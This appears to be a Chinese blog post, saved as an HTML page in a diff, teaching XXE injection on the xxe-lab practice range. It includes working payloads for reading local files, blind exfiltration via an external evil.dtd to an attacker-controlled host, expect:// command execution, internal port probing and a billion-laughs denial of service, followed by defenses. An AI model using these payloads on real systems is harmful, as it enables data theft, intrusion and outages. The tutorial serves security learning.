@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="一、什么是XXE漏洞？XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/04/20/浅谈XXE漏洞：从XML到文件读取/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="一、什么是XXE漏洞？XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/web/xxe1.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe2.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe3.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe4.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe5.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe6.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe7.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe8.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe9.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe10.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe11.jpg">
+<meta property="og:image" content="http://yoursite.com/web/xxe12.jpg">
+<meta property="og:updated_time" content="2020-07-25T09:17:25.585Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF漏洞">
+<meta name="twitter:description" content="一、什么是XXE漏洞？XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。">
+<meta name="twitter:image" content="http://yoursite.com/web/xxe1.jpg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>SSRF漏洞 | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-浅谈XXE漏洞：从XML到文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/" class="article-date">
+      <time datetime="2020-04-19T16:00:00.000Z" itemprop="datePublished">2020-04-20</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      SSRF漏洞
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="一、什么是XXE漏洞？"><a href="#一、什么是XXE漏洞？" class="headerlink" title="一、什么是XXE漏洞？"></a>一、什么是XXE漏洞？</h2><p>XXE漏洞全称是XML External Entity Injection，即XML外部实体注入漏洞，当XML允许引用外部实体并解析时，攻击者就可以构造恶意实体的payload进行注入攻击，造成文件读取、命令执行、攻击内网网站及SSRF等危害。</p>
+<a id="more"></a>
+<h2 id="二、什么是XML，DTD？"><a href="#二、什么是XML，DTD？" class="headerlink" title="二、什么是XML，DTD？"></a>二、什么是XML，DTD？</h2><p>XML全称是可扩展标记语言（EXtensible Markup Language），它的格式与HTML很像，通常被用来传输和存储数据，XML的标签没有被预定义，所以我们需要自行定义标签。</p>
+<p>DTD全称是文档类型定义(Document Type Definition)，是一套关于标记符的语法规则。它可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE student [</span><br><span class="line">	&lt;!ELEMENT student (name,age,info)&gt;</span><br><span class="line">	&lt;!ELEMENT name	(#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT age	(#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT info	(#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;student&gt;</span><br><span class="line">	&lt;name&gt;小星&lt;/name&gt;</span><br><span class="line">	&lt;age&gt;18&lt;/age&gt;</span><br><span class="line">	&lt;info&gt;三好学生&lt;/info&gt;</span><br><span class="line">&lt;/student&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>XML的一般格式：</strong></p>
+<p>1、XML声明：<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code></p>
+<p>2、定义文档内部或者引用外部实体格式：<br>（1）内部DTD文档：<code>&lt;!DOCTYPE 根元素 [定义内容]&gt;</code><br>（2）外部DTD文档：</p>
+<ul>
+<li><p>当引用的DTD文件是本地文件的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 system &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当引用的DTD文件是一个公共的文件时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD文件名称&quot; &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>3、引用实体：<code>&amp;实体名称</code></p>
+<h2 id="三、XXE漏洞"><a href="#三、XXE漏洞" class="headerlink" title="三、XXE漏洞"></a>三、XXE漏洞</h2><p>什么情况下会出现XXE漏洞呢？我们看下面这段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码引用了一个外部实体，变量名为xxe，值为：file:///etc/passwd，然后用&amp;xxe引用实体。当我们构造恶意实体的payload，对引用实体路径进行注入攻击时，就造成了xxe攻击。</p>
+<h2 id="四、XXE漏洞的危害"><a href="#四、XXE漏洞的危害" class="headerlink" title="四、XXE漏洞的危害"></a>四、XXE漏洞的危害</h2><p>进行XXE漏洞测试时，除了一些XML的基础外，还需要了解不同的协议，PHP支持的协议有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p><strong>任意文件读取</strong></p>
+<p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo LIBXML_DOTTED_VERSION;</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$dom = new DOMDocument(); </span><br><span class="line">$dom-&gt; LoadXML($xmlfile, LIBXML_BIGLINES | LIBXML_NOWARNING | LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom ($dom);</span><br><span class="line">echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>index.php需要接收一个POST请求才能执行，我们把以下XML代码POST过去就可以实现任意文件读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/web/xxe1.jpg">
+
+<p><strong>实例：</strong></p>
+<p>靶场环境：xxe-lab<br>源码下载链接：<a href="https://codeload.github.com/c0ny1/xxe-lab/zip/master" target="_blank" rel="noopener">https://codeload.github.com/c0ny1/xxe-lab/zip/master</a></p>
+<p>进入靶场，发现这是一个登陆界面</p>
+<img src="/web/xxe2.jpg">
+
+<p>用burpsuite抓包发现，数据是利用XML进行传输的</p>
+<img src="/web/xxe3.jpg">
+
+<p>从上图可以看出响应包中显示的内容为username的值，然后我们就可以构造payload，最后输出在username里就可以了<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/web/xxe4.jpg">
+
+<p>这种是有回显的xxe注入。</p>
+<p>接下来我们尝试一下无回显的情况，修改源代码，添加<code>error_reporting(0);</code>禁止报错，并注释输出。</p>
+<img src="/web/xxe5.jpg">
+
+<p>再次尝试注入就不会返回结果</p>
+<img src="/web/xxe6.jpg">
+
+<p>这时我们就需要进行参数实体注入</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test[ </span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/xxe-lab/php_xxe/doLogin.php&quot;&gt; </span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.129/evil.dtd&quot;&gt;</span><br><span class="line">	%dtd; </span><br><span class="line">	%send; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>%表示参数实体，% file表示定义一个名为file的参数实体，然后再SYSTEM引用外部实体内容<code>&#39;php://filter/read=convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/xxe-lab/php_xxe/doLogin.php&#39;</code></p>
+<p>这里我们还需要kail，开启kali的apache2服务，然后在/var/www/html目录下新建文件evil.dtd，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.1.129/?content=%file;&apos;&gt;&quot;&gt; </span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们开始监控apache的访问日志，在终端输入：</p>
+<img src="/web/xxe7.jpg">
+
+<p>然后发送请求，执行payload</p>
+<img src="/web/xxe8.jpg">
+
+<p>浏览器上还是没有显示结果，不过这时再查看监控的日志文件，发现已经得到了doLogin.php的源码</p>
+<img src="/web/xxe9.jpg">
+
+<p><strong>命令执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>这种情况下得安装Expect拓展才能，而默认情况下expect是没有安装的。</p>
+<img src="/web/xxe10.jpg">
+
+<p><strong>内网探测/SSRF</strong></p>
+<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
+<p>还用刚才的xxe-labs来演示，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY  xxe SYSTEM &quot;http://192.168.1.106:81&quot; </span><br><span class="line">&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/web/xxe11.jpg">
+
+<p>这里虽然有些地方是乱码的，不过可以看出81端口是没有开放的，我们再对比一下80端口的返回结果</p>
+<img src="/web/xxe12.jpg">
+
+<p>虽然80端口也有一点报错信息，但经过对比可以明显看出80端口是开放的。</p>
+<p><strong>DDoS拒绝服务攻击</strong></p>
+<p>示例代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"> &lt;!DOCTYPE xxez [</span><br><span class="line"> &lt;!ENTITY xxe &quot;xxe&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe2 &quot;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&amp;xxe;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe3 &quot;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&amp;xxe2;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe4 &quot;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&amp;xxe3;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe5 &quot;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&amp;xxe4;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe6 &quot;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&amp;xxe5;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe7 &quot;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&amp;xxe6;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe8 &quot;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&amp;xxe7;&quot;&gt;</span><br><span class="line"> &lt;!ENTITY xxe9 &quot;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&amp;xxe8;&quot;&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line"> &lt;xxez&gt;&amp;xxe9;&lt;/xxez&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该攻击原理为：构造恶意的XML实体文件耗尽可用内存，由于许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，就会导致解析非常慢，从而造成了拒绝服务器攻击。</p>
+<h2 id="五、XXE的防御措施"><a href="#五、XXE的防御措施" class="headerlink" title="五、XXE的防御措施"></a>五、XXE的防御措施</h2><p><strong>1、使用开发语言提供的禁用外部实体的方法</strong></p>
+<p><strong>PHP:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
+
+<p><strong>JAVA:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure>
+
+<p><strong>Python:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、过滤用户提交的XML数据</strong><br>过滤关键词：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>通过总结，让我对XXE漏洞有了一个全新的认识，这其中也花了很长时间，特别是测试的过程，有些地方网上描述的不是很清楚，所以自己花了很长时间来查资料和实践，不过还好，多花点时间在学习上总比无所事事强。</p>
+<p><strong>参考：</strong><br><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a><br><a href="https://blog.csdn.net/u012991692/article/details/80866826" target="_blank" rel="noopener">https://blog.csdn.net/u012991692/article/details/80866826</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9147595.html</a><br><a href="https://blog.csdn.net/nzjdsds/article/details/98763063" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/98763063</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/">SSRF漏洞</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2020-04-20, 00:00:00</p>
+        <p><span>最后更新:</span>2020-07-25, 17:17:25</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/04/20/浅谈XXE漏洞：从XML到文件读取/" title="SSRF漏洞">http://yoursite.com/2020/04/20/浅谈XXE漏洞：从XML到文件读取/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/04/20/浅谈XXE漏洞：从XML到文件读取/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/07/25/内网渗透之windows基础/">
+                    Windows基础
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/04/04/SSRF漏洞/">
+                    SSRF漏洞
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、什么是XXE漏洞？"><span class="toc-number">1.</span> <span class="toc-text">一、什么是XXE漏洞？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、什么是XML，DTD？"><span class="toc-number">2.</span> <span class="toc-text">二、什么是XML，DTD？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、XXE漏洞"><span class="toc-number">3.</span> <span class="toc-text">三、XXE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、XXE漏洞的危害"><span class="toc-number">4.</span> <span class="toc-text">四、XXE漏洞的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、XXE的防御措施"><span class="toc-number">5.</span> <span class="toc-text">五、XXE的防御措施</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#六、总结"><span class="toc-number">6.</span> <span class="toc-text">六、总结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
